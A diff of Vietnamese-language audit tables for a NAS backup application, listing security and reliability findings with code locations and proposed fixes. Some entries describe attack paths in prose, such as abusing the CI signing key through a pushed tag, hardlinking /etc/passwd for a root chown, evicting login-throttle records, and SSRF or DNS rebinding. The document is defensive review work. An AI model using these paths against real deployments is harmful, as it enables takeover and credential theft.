-| U2 | Trung bình | `updater.ts:982-1029`, `release.yml:33-47` | File `.sha256` nằm cùng release với tarball, nên ai sửa được asset thì sửa được cả hai. SHA-256 chỉ đảm bảo toàn vẹn, không xác thực nguồn gốc. | Ký detached (minisign hoặc cosign) và nhúng public key vào app, hoặc dùng GitHub artifact attestation. |
-| U3 | Trung bình | `updater.ts:1141-1153, 1325-1337` (catch ở `1434-1443`) | `/app/node_modules` bị swap trước bước snapshot và kích hoạt. Nếu bước sau lỗi (ví dụ ENOSPC), khối catch chỉ xóa staging, để lại code cũ chạy với dependency mới và không có rollback. | Kích hoạt `node_modules` ở bước cuối cùng, hoặc backup lại và khôi phục trong catch. |
-| U4 | Trung bình | `updater.ts:210-216, 1421-1423`, `offsite-cloud.ts:1239-1243`, `queue.ts:569` | Trong lúc build (có thể tới 15 phút), cron vẫn khởi chạy job mới, và upload offsite không được tính là job đang chạy. `process.exit(0)` sau đó cắt ngang chúng: multipart S3 bỏ dở, còn `offsite_sync_jobs` kẹt ở UPLOADING mãi mãi. | Scheduler và offsite phải tôn trọng cờ "đang cập nhật". Tính UPLOADING là job đang chạy. Khi khởi động, dọn các row UPLOADING bị kẹt. |
-| E1 | Trung bình | `docker-entrypoint.sh:116-125` | `package.json` và lockfile bị ghi đè trước khi `npm install`. Nếu install lỗi (ví dụ mất mạng lúc boot), lần boot sau thấy dependency "đã giống", nên chạy code mới trên `node_modules` cũ và có thể crash loop. | Chỉ copy `package.json` sau khi install thành công, install vào thư mục tạm rồi mới swap, và dùng `npm ci`. |
-| R1 | Trung bình | `release.yml:8-9, 17-18, 26-31` | Job release vừa có quyền `contents: write` vừa chạy `npm ci` (script cài đặt của dependency) với credential checkout được giữ lại. Một dependency độc có thể push lên repo hoặc thay asset cùng file `.sha256`. | Tách job build (`contents: read`, `persist-credentials: false`) khỏi job publish. Pin action theo SHA. Thêm `needs: release` cho job `docker-ghcr` (hiện image vẫn được đẩy lên dù test fail). |
-| O1 | Trung bình (mất dữ liệu offsite) | `offsite-cloud.ts:1024-1026, 1051-1058` | Prune Google Drive dùng truy vấn `name contains 'nas-sync-web-'`, nên khớp luôn file của `nas-sync-web-2-…`. Push server `web` sẽ giữ N bản mới nhất **gộp chung cả hai server** và xóa bản offsite của `web-2`. Đã tự đọc code và xác nhận. | Lọc chính xác prefix + pattern tên snapshot ở phía client, hoặc gắn `appProperties.host` cho file rồi truy vấn theo đó. |
-| O2 | Trung bình | `offsite-cloud.ts:13, 511-514` | Part multipart cố định 8 MiB mà S3/R2/B2 giới hạn 10.000 part, nên snapshot trên khoảng 78 GiB fail sau khi đã upload xong 78 GiB. | Tính kích thước part theo tổng dung lượng ước lượng và assert số part ≤ 10.000. |
-| O3 | Trung bình | `offsite-cloud.ts:1202-1221`, `api/offsite/route.ts:73-87` | `push_snapshot` nhận job ở mọi trạng thái. OPERATOR có thể push thư mục dở dang của job RUNNING/FAILED; bản này được ghi COMPLETED và tính vào `keepCount`, đẩy một bản tốt ra khỏi danh sách giữ lại. | Bắt buộc `status='COMPLETED'` và server đó không có job đang chạy. |
+| U6 | **Cao** | `release.yml:3-6, 58-80` | `RELEASE_SIGNING_PRIVATE_KEY` là secret thường của repo, được dùng cho mọi tag `v*.*.*` push lên bất kỳ commit nào: không có environment cần duyệt, không kiểm tra nhánh. Ai có quyền push (hoặc PAT có `contents:write` bị lộ) chỉ cần push `v9.9.9` trên một commit độc là CI ký, và mọi NAS cài nó với nhãn "Ed25519 verified". Đây chính là rủi ro của U1, chỉ đổi đường từ `main` sang tag. | Đưa secret vào GitHub Environment có required reviewers. Bật tag protection. Kiểm tra commit của tag nằm trên `main`. Tốt nhất là ký offline hoặc bằng khóa phần cứng. |
+| U7 | **Cao** | `release.yml:30-36, 44-56, 90-105` | Job build chạy `npm ci` có lifecycle script. Một dependency độc (kể cả devDependency) có thể sửa `.next` hoặc `src` trước khi đóng gói. Job publish tính lại SHA từ artifact rồi ký, nên chữ ký "hợp thức hóa" bản build đã bị chiếm. | `npm ci --ignore-scripts` ở job build, tách bước đóng gói khỏi bước install. Cân nhắc thêm build provenance attestation. |
+| U8 | Trung bình | `updater.ts:28-41`, `docker-entrypoint.sh:74`, `package-prebuilt.mjs:43` | `docker-entrypoint.sh` có trong tarball prebuilt nhưng không bao giờ được chép vào image đang chạy. Bản cài từ image cũ rồi cập nhật qua UI vẫn chạy entrypoint cũ (chạy root, còn lỗi E1), trong khi UI báo v1.7.0 kèm đủ bản sửa. | Cảnh báo "cần pull hoặc rebuild image" khi hash entrypoint khác, hoặc thêm kiểm tra `minImageVersion`. |
+| U9 | Trung bình | `update.sh:67-90`, `release.yml:113-117` | Script `update.sh` chạy root trên host rồi `docker compose up --build`, và dùng `nas-sync-bundle.tar.gz` không có chữ ký. Nếu tải `.sha256` lỗi hoặc file rỗng, script bỏ qua bước kiểm tra mà không báo (dòng 71, 78). Nếu tải bundle lỗi, nó kéo `codeload …/refs/tags/<tag>` không kiểm tra gì (dòng 87). | Ký cả bundle và kiểm tra trong `update.sh`. Fail-closed khi thiếu sha hoặc sig. Bỏ fallback codeload. |
+| U10 | Trung bình | `updater.ts:641-671, 1338-1342`, `docker-entrypoint.sh:20-21, 42` | Updater chỉ nhận ra thay đổi dependency qua `package.json.dependencies`. Thay đổi chỉ trong lockfile (bản vá bảo mật transitive, hoặc patch của next / socket.io trong cùng range `^`) không bao giờ được cài, nên `.next` build ở CI chạy với `node_modules` khác phiên bản. | So hash `package-lock.json` và chạy `npm ci` trong staging khi khác. |
+| U11 | Trung bình | `package-release.mjs:145-149`, `install.sh:86-105` | Bundle release đã có sẵn `.env` (copy từ `.env.example`), nên `[ ! -f ./.env ]` trong `install.sh` luôn false và cả khối setup không chạy. Hệ quả: `SANDBOX_DB_PASSWORD` giữ mặc định `sandbox_secret_pass`, không sinh `TOTP_ENCRYPTION_KEY`, không dò `NAS_VOL1_PATH` theo nền tảng, không lấy PUID từ `SUDO_UID`. Trên TrueNAS/QNAP, thư mục backup `/volume1/VPS_Backups` bị tạo trên ổ hệ điều hành thay vì pool. Đã tự đọc code để xác nhận. | Không đóng `.env` vào bundle, hoặc để `install.sh` nhận ra `.env` chưa sửa bằng cách so với `.env.example`. |
+| U12 | Thấp / Trung bình | `docker-compose.yml:39-77`, `.env.example:24-37, 57` | Compose không có `env_file:`, và `environment:` không truyền `GITHUB_TOKEN`, `TOTP_ENCRYPTION_KEY`, `TRUST_PROXY`, `FORCE_RESET_ADMIN_PASSWORD`, `FORCE_RESET_ADMIN_2FA`. Đặt các biến này trong `.env` (như tài liệu hướng dẫn) không có tác dụng. | Truyền rõ từng biến đã ghi trong tài liệu; tránh `env_file` toàn bộ để không lọt `ALLOW_UNVERIFIED_MAIN_UPDATE`. |
+| U13 | Thấp | `updater.ts:1146, 1194-1202, 1321`, `release-signature.ts:41` | Không chống hạ cấp: với `force: true`, updater cài bản `releases/latest` chỉ tới ngay cả khi bản đó cũ hơn bản đang chạy. v1.6.0 cũng có chữ ký hợp lệ (đã kiểm tra trên release thật). | Yêu cầu `compareSemver(relVer, local) >= 0` trừ khi chọn rollback rõ ràng; có thể ghi lại version cao nhất đã cài. |
+| U14 | Thấp | `updater.ts:1602-1606, 1662-1668` | (a) Nếu `syncReleaseDirToAppRoot` lỗi sau khi đã rename `staging → current`, catch khôi phục `/app` nhưng giữ `current` mới, nên lần restart sau entrypoint vẫn áp bản cập nhật "lỗi" đó. (b) Catch luôn rm + cp từ `previous` đè lên `/app` kể cả khi `/app` chưa bị đụng tới. | Theo dõi cờ `appRootTouched`; khi lỗi thì đưa `current` về chỗ cũ hoặc xóa đi. |
+| U15 | Thấp | `updater.ts:1491-1524` | Chỉ ở kênh dev: khi dependency không đổi, `node_modules` của staging symlink tới `/app/node_modules` đã bị prune devDependencies, nên `next build` sẽ lỗi (*cần xác nhận*). | Luôn `npm ci --include=dev` trong staging cho kênh dev. |
+| U16 | Thấp | `sign-release.mjs:81`, `release.yml:85`, `release-signature.ts:9-11` | Workflow không dùng `sign-release.mjs` mà chép lại logic inline. Script có lối tắt `SKIP_DEFAULT_PUBKEY_CHECK`. Public key bị chép ở 3 nơi, nên dễ lệch nhau. | Workflow gọi đúng một script, và script lấy key từ một nguồn duy nhất. |
+| O7 | Thấp | `offsite-cloud.ts:229-246, 554` | Phân giải DNS để kiểm tra xong thì `fetch` phân giải lại lần nữa, nên DNS rebinding vẫn tới được IP nội bộ (chỉ ADMIN cấu hình được). | Ghim IP đã kiểm tra bằng `lookup` / `connect` tùy biến của undici. |
+| E2 | Thấp | `docker-entrypoint.sh:118` | Entrypoint `chown -R /app` bằng root mỗi lần boot, trong khi `/app` cho user app ghi. Nếu host đặt `fs.protected_hardlinks=0`, user app có thể hardlink `/etc/passwd` vào `/app` và được chown ở lần boot sau (*cần xác nhận theo sysctl của host*). | Chỉ chown lần đầu, hoặc `find -user 0 ! -links +1`. |
 
 ### Độ tin cậy: hàng đợi, job, mất dữ liệu
 
 | # | Mức | Vị trí | Kịch bản lỗi | Đề xuất sửa |
 |---|---|---|---|---|
-| N1 | **Cao** | `queue.ts:189, 207, 302-312`, `restore-worker.ts:713`, `backup-worker.ts:773` | `processJobPayload` chỉ bỏ qua job ở trạng thái CANCELLED. BullMQ mặc định `attempts: 10` và worker luôn `throw err` khi lỗi, nên **restore FAILED bị chạy lại tới 9 lần nữa**: mỗi lần là `rsync --delete` vào webroot production, import lại DB và gửi thêm một cảnh báo CRITICAL. Ngoài ra, job INTERRUPTED được dispatch lại với jobId mới khi khởi động, và nút "Thử lại" vẫn bấm được khi còn retry đang chờ, nên một job có thể chạy 2 lần. Nếu backup đã COMPLETED bị chạy lại và thất bại, snapshot tốt bị `rmSync` mất. Đã tự xác nhận phần (a). | Claim job nguyên tử: `UPDATE … SET status='RUNNING' WHERE id=? AND status IN ('QUEUED','INTERRUPTED')`. Ném `UnrecoverableError` cho lỗi không nên retry. Dùng jobId cố định. Chặn retry khi job đã COMPLETED hoặc đang INTERRUPTED chờ retry. |
-| N2 | **Cao** | `restore-worker.ts:172-188`, `postgres-streamer.ts:250-267`, `sandbox-verifier.ts:58-65`, `worker-state.ts:39-55` | `terminateChildGracefully` chỉ gửi signal cho tiến trình `bash`, còn `zstd`, `ssh` và `mariadb` vẫn chạy và giữ pipe mở, nên `'close'` không bao giờ phát. Hủy restore DB không có tác dụng. Timeout 10 phút của sandbox cũng vô hiệu: job kẹt ở VERIFYING và giữ lock cùng slot hàng đợi mãi mãi. | Spawn với `detached: true` rồi `process.kill(-pid)`, hoặc tách decompressor và ssh thành hai child riêng, nối pipe trong Node. |
-| N3 | **Cao** | `explorer/archive/route.ts:154-161` | Route enqueue mọi chunk của tar mà không kiểm tra `desiredSize` (không có backpressure). Client chậm cộng snapshot lớn làm heap Node phình không giới hạn, OOM làm sập tiến trình kéo theo mọi backup đang chạy. | Dùng `Readable.toWeb(child.stdout)` hoặc stream pull-based có pause/resume. |
-| N4 | **Cao** | `backup-worker.ts:716-732`, `queue.ts:258, 349`, `morning-digest.ts:369` | Khi hết lượt retry, job ở lại INTERRUPTED vĩnh viễn: không có alert CRITICAL, không gửi Telegram, và digest chỉ đếm FAILED. Một VPS offline khoảng 4 giờ có thể khiến backup đêm đó mất trong im lặng. | Ở lần thử cuối, chuyển job sang FAILED và gửi alert CRITICAL. |
-| N5 | **Cao** (*cần xác nhận khi chạy thật*) | `restore-worker.ts:194-214`, `postgres-streamer.ts:273-293`, `sandbox-verifier.ts:11, 71-86` | Watchdog idle chỉ coi stdout/stderr là hoạt động, mà client mysql không in gì khi import. Vì vậy mọi restore MySQL dài hơn 30 phút bị kill với lỗi "Idle Timeout". Giới hạn cứng 10 phút của sandbox khiến DB lớn bị đánh CORRUPTED và cảnh báo mỗi đêm. | Tính byte đọc từ file dump là hoạt động. Scale timeout sandbox theo kích thước dump. |
-| N6 | Trung bình | `backup-worker.ts:151, 703-773` | Thư mục `.in_progress_<snapshot>` không bao giờ bị xóa khi job FAILED/CANCELLED. Mỗi đêm lỗi để lại dữ liệu thay đổi cộng cả cây thư mục cho đến khi đầy đĩa. | Xóa khi FAILED/CANCELLED (giữ lại khi INTERRUPTED), và quét dọn các `.in_progress_*` cũ lúc khởi động. |
-| N7 | Trung bình | `queue.ts:285-294, 349` | Ở Local mode, job QUEUED mất khi restart (hàng đợi `localPending` nằm trong RAM) và kẹt ở QUEUED mãi. Server cũng kẹt ở `BACKUP_RUNNING`. Recovery khi khởi động không tăng `retry_count`, nên job làm crash tiến trình có thể gây crash loop. | Khi khởi động, dispatch lại các job QUEUED và tăng `retry_count` cho job được recover. |
-| N8 | Trung bình | `queue.ts:200, 247` | Job tăng `localRunningCount++` (và chiếm slot BullMQ) *trước* khi chờ lock server. Hai job xếp sau một backup dài của cùng server đã chiếm hết 3 slot, làm các server khác bị đói. | Kiểm tra lock trước khi chiếm slot, hoặc requeue job khi server đang bận. |
-| N9 | Trung bình | `notifications.ts:53, 237-256` | Alert CRITICAL chứa toàn bộ stderr của rsync (có thể trên 32 KB) trong khi Telegram giới hạn 4096 ký tự, và lỗi bị nuốt mất do gọi kiểu `void`. Kết quả là alert quan trọng nhất không bao giờ tới nơi. | Cắt message còn khoảng 3500 ký tự và log lỗi gửi. |
-| N10 | Trung bình | `servers/[id]/route.ts:43, 125`, `explorer.ts:48`, `retention-gfs.ts:226` | Đổi `hostname` của server làm mọi snapshot cũ thành mồ côi: không restore hay duyệt được, retention xóa row trong DB nhưng file vẫn nằm trên đĩa, và lần backup sau là bản full. | Khóa trường hostname khi server đã có snapshot, hoặc lưu đường dẫn snapshot theo `server_id`. |
-| N11 | Trung bình (*cần xác nhận*) | `restore-worker.ts:495` | `chown -hR` dưới nice/ionice dùng timeout mặc định 60s của `execRemoteSSH`. Webroot lớn vượt thời gian này nên restore bị đánh FAILED dù file đã push xong. | Truyền timeout dài hơn, hoặc dùng watchdog idle cho bước này. |
-| N12 | Trung bình | `backup-worker.ts:566, 579-631` | Nếu verify/anomaly ném lỗi sau khi snapshot đã được rename vào chỗ (ví dụ sandbox container restart), job bị FAILED. Snapshot tốt bị ẩn khỏi restore (chỉ liệt kê COMPLETED) và retention cũng không bao giờ dọn nó. `refreshAllVolumes()` ném lỗi sau `updateLatestSymlink` cũng gây ra tình trạng FAILED trong khi `latest` vẫn trỏ vào snapshot đó. | Sau commit, bắt lỗi verify/anomaly theo từng DB và đánh dấu UNTESTED thay vì làm fail cả job. |
+| N18 | **Cao** | `queue.ts:620, 844` so với `backup-worker.ts:774-808`, `queue.ts:372-375` | BullMQ có `attempts: MAX_BACKUP_RETRIES` (10), trong khi worker cho retry khi `nextRetry <= 10`. Lần thử thứ 10 lỗi: worker set INTERRUPTED rồi throw, còn BullMQ đã hết lượt nên chuyển job sang failed. Trong DB, job nằm im ở INTERRUPTED: không có cảnh báo CRITICAL, digest không đếm, và chỉ thành FAILED ở lần restart container sau (`queue.ts:572-606`). Hệ quả là N4 cũ vẫn còn ở BullMQ mode: VPS offline làm mất backup đêm đó mà không ai biết. Đã tự đọc code để xác nhận. | `attempts = MAX + 1`, hoặc kiểm tra `attemptsMade + 1 >= opts.attempts` (hoặc thêm `worker.on('failed')`) để chuyển FAILED và gửi CRITICAL. Thống nhất ngưỡng `<=` / `>=` với logic lúc khởi động (`queue.ts:577, 682`). |
+| N19 | Trung bình | `queue.ts:505-512, 561-567`, `backup-worker.ts:229, 570-574` | Container restart khi job đang VERIFYING, lúc snapshot đã được rename vào chỗ. Khi khởi động, job bị chuyển sang INTERRUPTED rồi chạy lại: xóa `backup_items` của job, pull full lại, rồi đến lúc commit thì `rmSync` snapshot tốt. Nếu lần chạy lại lỗi không retry được, job thành FAILED và không còn item nào: snapshot vẫn nằm trên đĩa nhưng không restore được, và retention cũng không dọn. | Khi khởi động, nếu thư mục snapshot cuối đã tồn tại thì đánh COMPLETED với item UNTESTED thay vì chạy lại. |
+| N20 | Trung bình | `backup-worker.ts:337, 774`, `extended-hosting-backup.ts:614, 673` | Admin hủy backup vì VPS không kết nối được. `execRemoteSSH` đang chạy (không đăng ký cancel) trả về 255 và ném `RetryableNetworkError`. Nhánh retry không kiểm tra `isJobCancelled`, nên job chuyển sang INTERRUPTED và tự resume sau 1–30 phút. | Thêm `&& !isJobCancelled(jobId)` ở dòng 774. |
+| N21 | Trung bình | `sandbox-verifier.ts:101-126, 790-795, 902-908` | Mỗi lần verify đều `ALTER USER nas_sync_verifier … IDENTIFIED BY <random>`. Hai backup của hai server verify cùng lúc (concurrency 3, lock theo server), hoặc `verify_sandbox` thủ công trùng với verify ban đêm: job B đổi mật khẩu, nên các lần spawn `mariadb` tiếp theo của job A bị "Access denied". Các DB đó bị đánh CORRUPTED và phát cảnh báo. | Mỗi job một user riêng (`verifier_<jobId>`), hoặc mutex toàn tiến trình bao quanh bước tạo credential và cả quá trình verify. |
+| N22 | Trung bình | `restore-worker.ts:357-390` | Các kiểm tra đầu vào ném lỗi *trước* khối `try` có ghi FAILED, trong khi `processJobPayload` đã claim job sang RUNNING. Ví dụ: server đích đã bị xóa (`target_server_id` thành NULL nhưng `restore_options.targetServerId` vẫn còn), item không còn, hoặc JSON `restore_options` hỏng. Restore kẹt ở RUNNING tới lần restart sau, không có cảnh báo. | Đưa các kiểm tra vào trong `try`, hoặc để `processJobPayload` chuyển FAILED khi status vẫn là RUNNING sau lỗi. |
+| N23 | Trung bình (*cần xác nhận khi chạy thật*) | `retention-gfs.ts:239`, `jobs/[id]/route.ts:348`, `worker-state.ts:196`, `backup-worker.ts:572` | `fs.rmSync` đồng bộ xóa cả snapshot hard-link nhiều triệu file trên HDD có thể chặn event loop hơn 30s (mặc định `lockDuration` của BullMQ). Stalled checker giao lại các job đang chạy; claim từ chối bản trùng nhưng BullMQ coi job đã xong, nên retry hoặc fail sau đó của lần chạy gốc gặp lỗi "Missing lock", và job kẹt ở INTERRUPTED. | Dùng `fs.promises.rm` hoặc spawn `rm -rf`; nâng `lockDuration`. |
+| N24 | Thấp / Trung bình | `queue.ts:139-152, 427-436`, `schedules/retention/route.ts:63` | Ở Local mode, hàm nhả lock không gọi `drainLocalQueue()`. Backup được enqueue trong lúc retention thủ công đang giữ lock sẽ nằm ở QUEUED cho tới khi có job khác xong hoặc được enqueue. | Gọi `drainLocalQueue()` qua `setImmediate` khi nhả lock. |
+| N25 | Thấp | `servers/[id]/route.ts:244` | Xóa server không kiểm tra job đang chạy: cascade xóa row job, nhưng worker vẫn ghi tiếp ra thư mục không ai quản lý. Snapshot cũ nằm trên đĩa mãi mãi, và nếu thêm lại server cùng hostname thì nó thừa hưởng `latest` cũ. | Trả 409 khi còn job đang chạy; hỏi người dùng giữ hay xóa thư mục host. |
+| N26 | Thấp | `queue.ts:298-306, 399-402, 751-756, 984-996` | WORM batch kích hoạt quá sớm: khối `finally` gỡ job khỏi batch ngay cả khi job sẽ retry. Với khoảng cách enqueue 1,5s, job đầu có thể xong (fail nhanh) trước khi job thứ hai được enqueue, làm batch rỗng và WORM chạy hai lần. | Chỉ gỡ khỏi batch khi job ở trạng thái kết thúc; đăng ký mọi jobId của batch trước khi dispatch. |
+| N27 | Thấp | `jobs/[id]/route.ts:160-162`, `queue.ts:861`, `worker-state.ts:115-117` | Hủy một job đã xong để lại cờ cancel vĩnh viễn. Lần `verify_sandbox` sau trên job đó kill mọi lượt import trong 3s và đánh mọi item CORRUPTED. | Từ chối cancel với job đã kết thúc, hoặc xóa cờ cancel trong `verify_sandbox`. |
+| N28 | Thấp | `ssh.ts:802-853`, `restore-worker.ts:657`, `volume-manager.ts:619-623`, `sandbox-verifier.ts:899, 918` | `execRemoteSSH` / `execLocalCommand` không đăng ký cancel, nên `chown` khi restore (tới 15 phút) và rsync seed volume (tới 1 giờ) không hủy được. `conn.query` của sandbox không có timeout, nên container sandbox treo có thể giữ job ở VERIFYING cùng lock server (*phần sau cần xác nhận*). | Đăng ký process vào cơ chế cancel; đặt query timeout. |
+| N29 | Thấp | `sql-stream-guard.ts:372-376`, `sandbox-verifier.ts:709, 751` | Giới hạn 64 MiB mỗi dòng áp dụng cả trong dữ liệu COPY. Dòng bytea hợp lệ lớn hơn khoảng 32 MiB (khi mã hóa hex) bị từ chối lúc restore và bị đánh CORRUPTED khi verify. | Bỏ giới hạn ở trạng thái COPY_DATA, hoặc stream dòng đó qua. |
 
-### Thấp
+### Auth, API, RBAC
 
-| # | Vị trí | Vấn đề |
-|---|---|---|
-| A1 | khoảng 25 route (`auth/login:175`, `auth/me:195`, `auth/2fa:366`, `users/*`, `jobs/*`, `schedules/*`, `ssh-keys`, `system/update`, `volumes/*`, `restore`, `explorer/*`, `gdrive-oauth:252`) | Vẫn trả nguyên văn `err.message`, trong đó `login` không cần xác thực. Nên dùng `safeErrorJson` thống nhất. |
-| A2 | `server.ts:136-149` và `api/alerts/route.ts:20, 110-130` | Bảng RBAC trong `server.ts` thiếu `/api/alerts`, nên VIEWER/OPERATOR nhận 403 (đã xác nhận khi chạy thử) và badge cùng trang `/alerts` hỏng với user không phải admin. Không khai thác được, chỉ là 2 bảng RBAC bị lệch nhau. |
-| A3 | `server.ts:312-332` | Socket.IO chỉ kiểm tra `token_version` lúc handshake, nên socket mở từ trước khi logout hoặc đổi role vẫn nhận log và alert. VIEWER cũng nhận cả tiến trình update. |
-| A4 | `totp.ts:138-175`, `auth/2fa/route.ts:122-180` | TOTP không chống replay (một mã dùng lại được trong khoảng 90s). Bật 2FA không tăng `token_version`. |
-| A5 | `totp.ts:10-22` | Khóa mã hóa TOTP và HMAC của recovery code được dẫn xuất từ `JWT_SECRET`, nên xoay `JWT_SECRET` sẽ khóa ngoài mọi user có 2FA. |
-| A6 | `auth/login/route.ts:62` | User không tồn tại thì bỏ qua scrypt, nên dò được username qua thời gian phản hồi. |
-| A7 | `audit.ts:40-49` | Khi `TRUST_PROXY=true` mà cổng NAS vẫn truy cập trực tiếp được, giả mạo `X-Forwarded-For` sẽ bypass được login throttle. Cần ghi rõ điều này trong tài liệu. |
-| A8 | `api/schedules/route.ts:7`, `api/volumes/route.ts:120`, `api/jobs/[id]/route.ts:70` | Các handler GET chỉ dựa vào lớp chặn của `server.ts` và không có `requireRole` riêng (phòng thủ nhiều lớp). |
-| S7 | `ssh.ts:660-667, 733-738` | Nhánh fallback `accept-new` + `UserKnownHostsFile=/dev/null` vẫn còn. Hiện mọi đường gọi đều pin key trước, nhưng nhánh này nên ném lỗi thay vì mở. |
-| S8 | `ssh.ts:165, 187-200` | Thư mục ControlMaster cố định ở `/tmp/.nas_ssh_mux` và không kiểm tra owner hay symlink. Nên chuyển vào `DATA_DIR`. |
-| S9 | `aapanel.ts` (`find … -exec chmod`) | Race đổi file thành symlink giữa `find` và `chmod` làm `chmod` đi theo symlink. Nên dùng `chmod -h` hoặc chạy bằng user `www`. |
-| S10 | `btrfs-worm.ts:36, 48` | Mặc định bỏ qua kiểm tra TLS của DSM (trừ khi `DSM_TLS_VERIFY=true`), nên mật khẩu admin DSM có thể lộ cho MITM. |
-| S11 | `directadmin.ts:26-28`, `cpanel.ts:22-24`, `cyberpanel.ts:21-27`, `hestiacp.ts:24-27` | Mật khẩu MySQL admin được kéo về NAS nhưng không hề được dùng. Nên bỏ. |
-| U5 | `updater.ts:1353-1367` | SHA ghi vào BUILD_INFO lấy từ một lần gọi API thứ hai, sau khi tải tarball, nên có thể lệch với code thực tế. Nên tải `tar.gz/<sha>` theo đúng SHA đã resolve. |
-| O4 | `offsite-cloud.ts:1286-1314` | tar lỗi sau khi upload xong để lại object mồ côi. Không giới hạn số push chạy song song. |
-| O5 | `offsite-cloud.ts:222-226, 366-370` | Endpoint S3 cho phép trỏ tới IP nội bộ và echo lại body phản hồi (SSRF; chỉ ADMIN cấu hình được). |
-| O6 | `offsite-cloud.ts:937-981` | Retry resumable Google Drive không hỏi offset server đã nhận trước khi gửi lại (*cần xác nhận*). |
-| C1 | `offsite-crypto.ts:7, 127-132` | Header (salt, chunkSize) không nằm trong AAD. PBKDF2 210k vòng thấp hơn khuyến nghị 600k và tham số KDF không được lưu trong header. `pbkdf2Sync` chặn event loop. CLI decrypt nhận passphrase qua argv. |
-| R2 | `release.yml`, `update-synology.sh:33-42` | Action chỉ pin theo major tag. Script trên host vẫn kéo `main` HEAD và `cp -rf` ghi đè `docker-compose.yml` mà user đã sửa. |
-| N13 | `volume-manager.ts:19` | `ln -snf` không nguyên tử và không kiểm tra exit code. Nên tạo symlink tạm rồi `rename`. |
-| N14 | `queue.ts:144-152` | Ba trigger trong cùng một giây sinh trùng tên snapshot, và lần commit sau `rm -rf` snapshot của job trước. |
-| N15 | `servers/route.ts:64`, `servers/[id]/route.ts:50` | Bật được `is_mock` cho server production qua API mà không có chặn theo môi trường. Việc này bỏ qua TOFU và tạo ra backup "COMPLETED" giả. |
-| N16 | `server.ts` | Không có handler `unhandledRejection`/`uncaughtException`. ENOSPC trong listener `'close'` của probe zstd (`mysql-streamer.ts:74-116`) sẽ làm sập tiến trình. |
-| N17 | `explorer.ts:340`, `sandbox-verifier.ts:153-174`, `rsync-runner.ts:14`, `queue.ts:594-597`, `db.ts` | `diffLines` đồng bộ trên 5 MB chặn event loop. Dump `.zst` ở Local Inspector chỉ được kiểm tra magic bytes. rsync exit 23 bị retry 10 lần. Snapshot btrfs chạy cố định 15 phút sau enqueue chứ không chờ backup xong. Các migration cột của bảng users dùng chung một try/catch. |
+| # | Mức | Vị trí | Kịch bản lỗi | Đề xuất sửa |
+|---|---|---|---|---|
+| A9 | Trung bình | `users/[id]/route.ts:102-138, 157-165` | ADMIN gửi `PATCH /api/users/<id của mình>` với `{"reset2fa": true, "password": "…"}` mà không phải nhập mật khẩu hiện tại hay TOTP, tức là bỏ qua bước xác thực lại mà `auth/2fa` (`2fa/route.ts:246-282`) và `auth/me` (`me/route.ts:53-92`) yêu cầu. Ai cầm cookie admin bị lộ là gỡ được 2FA, đặt mật khẩu mới và đá admin thật ra. Reset admin khác cũng không cần xác thực lại. Lỗi có từ `81dbf5b` nhưng lần 2 bỏ sót. | Khi `targetId === session.userId`, từ chối `password` / `reset2fa` và chuyển sang route tự phục vụ. Yêu cầu mật khẩu (và TOTP) của admin trước khi reset người khác. |
+| A10 | Trung bình | `jobs/[id]/route.ts:128, 165-223`, `server.ts:176` | Tạo restore chỉ dành cho ADMIN (`restore/route.ts:52`), nhưng OPERATOR có thể `PATCH {action: "retry"}` một job **RESTORE** đã FAILED hoặc CANCELLED để chạy lại. Ví dụ: admin hủy một lệnh restore nhầm snapshot cũ vào production, rồi operator bấm retry và ghi đè file cùng DB production. Retry không ghi audit log. | Bắt buộc ADMIN khi `job_type === 'RESTORE'`; ghi audit cho retry, cancel, pin và unpin. |
+| A11 | Trung bình | `db.ts:649-695`, `settings/route.ts:20-32, 209-215`, `settings/page.tsx:281, 531-535` | Migration v1.7 copy `dsm_password` sang `worm_password` nhưng không xóa các row `dsm_*` cũ, mà `dsm_password` không còn trong `SECRET_SETTING_KEYS`. Trên mọi bản nâng cấp từ ≤ 1.6 có cấu hình DSM, `GET /api/settings` trả **mật khẩu admin NAS dạng plaintext**, React state giữ nó và gửi lại mỗi lần lưu. Tên key được ghép bằng `['d','s','m_'].join('')`, nên grep `dsm_` không tìm thấy. Đã tự đọc code để xác nhận. | Xóa các row `dsm_*` sau khi migrate, và để GET chỉ trả các key nằm trong allowlist. |
+| A12 | Thấp | `2fa/route.ts:102, 139, 256, 352`, `me/route.ts:83` | Bước kiểm tra mật khẩu hiện tại (và TOTP khi tắt 2FA hay sinh lại recovery code) không có throttle. Ai có session là dò mật khẩu online không giới hạn được. | Dùng lại `login-throttle`, khóa theo userId. |
+| A13 | Thấp | `login-throttle.ts:53-58`, `password.ts:22` | Store giữ tối đa 5000 entry và loại entry cũ nhất. Từ một IP, gửi khoảng 5000 lần login sai với username ngẫu nhiên là đẩy được chính record `IP\|admin` đang bị khóa ra khỏi store. Mỗi lần thử còn chạy scrypt đồng bộ, gây DoS CPU mà không cần xác thực. | Đếm riêng theo IP và không bao giờ loại entry đang bị khóa. Dùng `crypto.scrypt` async. |
+| A14 | Thấp | `totp.ts:51-65` | `.totp_secret` có nhưng không đọc được thì code fallback sang khóa ngẫu nhiên trong RAM. File ngắn hơn 32 ký tự thì code ghi đè file. Kết quả: secret 2FA mới được mã hóa bằng khóa mất đi sau khi restart, và secret cũ không giải mã được, nên user có 2FA bị khóa ngoài. | Fail-closed (throw), không bao giờ ghi đè file khóa đã có. |
+| A15 | Thấp | `me/route.ts:126-128`, `users/route.ts:78-80`, `db.ts:117` | Tự đổi username chỉ so sánh phân biệt hoa thường, trong khi tạo user dùng `LOWER()`. VIEWER đổi tên thành `Admin` song song với `admin`, gây nhầm trong danh sách user và audit log. | Kiểm tra bằng `LOWER()` và đặt `COLLATE NOCASE` cho cột. |
+| A16 | Thấp | `volumes/snapshot/route.ts:5-13`, `worm-snapshot.ts:571-573` | Route mới không có try/catch và không ghi audit log, lại trả nguyên văn lỗi (có thể chứa URL hoặc IP nội bộ) với HTTP 500. | Thêm audit log và cho lỗi đi qua `sanitizeErrorMessage`. |
+| A17 | Thấp | `jobs/route.ts:16` | `?limit=-1` thành `LIMIT -1` của SQLite, tức là không giới hạn, nên VIEWER dump được mọi job. `?limit=abc` cho ra NaN, mà handler không có try/catch. | `Math.max(1, …)` và kiểm tra `Number.isFinite`. |
+| A18 | Thấp | `schedules/*`, `volumes/*`, `servers/[id]/test`, `jobs/[id]/route.ts:147-163` | Các thao tác ghi này không có `recordAuditLog`. OPERATOR unpin snapshot không để lại dấu vết, và lần retention GFS sau có thể xóa luôn snapshot đó. | Ghi audit cho các mutation; cân nhắc chỉ cho ADMIN unpin. |
+
